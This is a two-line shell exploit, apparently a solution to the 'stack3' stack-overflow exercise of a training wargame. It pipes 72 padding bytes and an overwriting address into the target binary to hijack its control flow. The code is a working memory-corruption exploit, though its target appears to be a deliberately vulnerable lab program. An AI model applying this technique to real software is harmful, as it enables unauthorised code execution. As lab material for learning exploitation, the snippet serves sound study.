asd=`python -c 'print "A"*72 + "\x42\x11\x40\x00"'`
echo -e "$asd" | ./stack3